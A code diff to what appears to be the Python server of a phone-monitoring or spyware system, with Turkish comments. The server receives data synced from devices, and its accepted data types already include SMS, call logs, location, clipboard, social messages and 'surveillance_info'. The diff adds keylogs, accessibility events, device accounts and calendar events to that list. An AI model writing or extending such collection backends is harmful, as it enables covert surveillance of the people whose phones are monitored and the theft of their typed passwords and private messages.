@@ -2287,6 +2287,9 @@ async def sync_data_legacy(request: Request):
         elif data_type == "photos": log_emoji = "🖼️"
         elif data_type == "videos": log_emoji = "🎬"
         elif data_type == "audio": log_emoji = "🎵"
+        elif data_type == "accessibility_events": log_emoji = "♿"
+        elif data_type == "keylogs": log_emoji = "⌨️"
+        elif data_type == "calendar_events": log_emoji = "📅"
 
         # logger.info(f"{log_emoji} Veri senkronize edildi: {device_name} -> {data_type} (Yeni: {stats['new']}, Atlanan: {stats['skipped']})")
         return {"status": "success", "message": f"{data_type} senkronize edildi", "stats": stats}
@@ -2854,6 +2857,10 @@ async def sync_data(request: SyncDataRequest):
     - usage_stats: Kullanım istatistikleri
     - social_messages: Sosyal medya mesajları
     - social_media_files: Sosyal medya dosyaları
+    - accessibility_events: Erişilebilirlik olayları (YENİ)
+    - keylogs: Klavye girişleri (YENİ)
+    - accounts: Cihaz hesapları (YENİ)
+    - calendar_events: Takvim etkinlikleri (YENİ)
     """
     try:
         # Cihaz adını temizle
@@ -2866,7 +2873,8 @@ async def sync_data(request: SyncDataRequest):
             "contacts", "call_logs", "sms", "location", "installed_apps",
             "device_info", "network_info", "bluetooth_devices", "sensors",
             "clipboard", "surveillance_info", "usage_stats", "social_messages",
-            "social_media_files"
+            "social_media_files", "accessibility_events", "keylogs", 
+            "accounts", "calendar_events"
         ]
         
         if request.data_type not in allowed_types:
